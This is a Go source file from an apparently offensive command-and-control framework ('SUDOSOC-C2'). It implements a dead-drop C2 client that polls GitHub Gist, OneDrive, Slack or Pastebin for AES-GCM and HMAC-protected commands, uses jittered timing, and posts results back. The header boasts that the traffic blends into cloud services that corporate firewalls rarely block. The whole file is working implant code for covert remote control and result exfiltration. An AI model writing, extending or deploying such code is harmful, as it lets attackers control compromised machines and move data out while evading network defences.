package deadrop

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Dead Drop C2 — Command & Control via legitimate cloud platforms.

	Supported platforms:
	  GitHub Gist  — Public/secret gist content as C2 channel
	  OneDrive     — Shared file in OneDrive as dead drop
	  Slack        — Channel message polling via Slack API
	  Pastebin     — Public paste as one-way drop

	All traffic is HTTPS to known CDN IPs (GitHub, Microsoft, Slack).
	Corporate firewalls rarely block these. No unusual destination IPs.

	Wire format:
	  base64( nonce(12) || AES-256-GCM(cmdID:payload) || HMAC-SHA256(ciphertext) )
*/

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	mrand "math/rand"
	"time"
)

// DeadDropConfig holds the configuration for a dead drop C2 channel.
type DeadDropConfig struct {
	Provider     Provider
	EncKey       [32]byte
	HMACKey      [32]byte
	PollInterval time.Duration
	JitterPct    int
	SessionID    string
}

// Provider is the interface each dead drop backend must implement.
type Provider interface {
	Name() string
	ReadCommand(ctx context.Context, sessionID string) ([]byte, error)
	WriteResult(ctx context.Context, sessionID string, result []byte) error
	IsConfigured() bool
}

// DeadDrop manages polling a dead drop C2 channel.
type DeadDrop struct {
	cfg  *DeadDropConfig
	seen map[string]bool
	rng  *mrand.Rand
}

// New creates a new DeadDrop C2 client.
func New(cfg *DeadDropConfig) *DeadDrop {
	if cfg.PollInterval == 0 {
		cfg.PollInterval = 60 * time.Second
	}
	if cfg.JitterPct == 0 {
		cfg.JitterPct = 40
	}
	return &DeadDrop{
		cfg:  cfg,
		seen: make(map[string]bool),
		rng:  mrand.New(mrand.NewSource(time.Now().UnixNano())),
	}
}

// RunLoop continuously polls the dead drop and processes commands.
func (d *DeadDrop) RunLoop(ctx context.Context, cmdCh chan<- []byte, respCh <-chan []byte) {
	for {
		select {
		case <-ctx.Done():
			return
		case <-time.After(d.jitteredInterval()):
		}

		enc, err := d.cfg.Provider.ReadCommand(ctx, d.cfg.SessionID)
		if err != nil || len(enc) == 0 {
			continue
		}

		cmd, id, err := d.decryptCommand(enc)
		if err != nil || d.seen[id] {
			continue
		}
		d.seen[id] = true

		select {
		case cmdCh <- cmd:
		default:
		}

		select {
		case result := <-respCh:
			encResult, err := d.encryptResult(result, id)
			if err != nil {
				continue
			}
			d.cfg.Provider.WriteResult(ctx, d.cfg.SessionID, encResult)
		case <-time.After(5 * time.Minute):
		}
	}
}

// ─── Crypto ──────────────────────────────────────────────────────────────

func (d *DeadDrop) encryptResult(plaintext []byte, cmdID string) ([]byte, error) {
	data := append([]byte(cmdID+":"), plaintext...)
	block, err := aes.NewCipher(d.cfg.EncKey[:])
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	mac := computeHMAC(d.cfg.HMACKey[:], ciphertext)
	return []byte(base64.StdEncoding.EncodeToString(append(ciphertext, mac...))), nil
}

func (d *DeadDrop) decryptCommand(encoded []byte) ([]byte, string, error) {
	envelope, err := base64.StdEncoding.DecodeString(string(encoded))
	if err != nil {
		return nil, "", fmt.Errorf("base64: %w", err)
	}
	if len(envelope) < 32+12+16 {
		return nil, "", fmt.Errorf("envelope too short")
	}
	ciphertext := envelope[:len(envelope)-32]
	mac := envelope[len(envelope)-32:]
	if !hmac.Equal(computeHMAC(d.cfg.HMACKey[:], ciphertext), mac) {
		return nil, "", fmt.Errorf("HMAC mismatch")
	}
	block, err := aes.NewCipher(d.cfg.EncKey[:])
	if err != nil {
		return nil, "", err
	}
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	plaintext, err := gcm.Open(nil, ciphertext[:ns], ciphertext[ns:], nil)
	if err != nil {
		return nil, "", err
	}
	for i, b := range plaintext {
		if b == ':' {
			return plaintext[i+1:], string(plaintext[:i]), nil
		}
	}
	return nil, "", fmt.Errorf("no cmd ID")
}

func computeHMAC(key, data []byte) []byte {
	h := hmac.New(sha256.New, key)
	h.Write(data)
	return h.Sum(nil)
}

func (d *DeadDrop) jitteredInterval() time.Duration {
	base := d.cfg.PollInterval
	jitter := time.Duration(float64(base) * float64(d.cfg.JitterPct) / 100.0)
	delta := time.Duration(d.rng.Int63n(int64(jitter*2+1))) - jitter
	if result := base + delta; result > 5*time.Second {
		return result
	}
	return 5 * time.Second
}
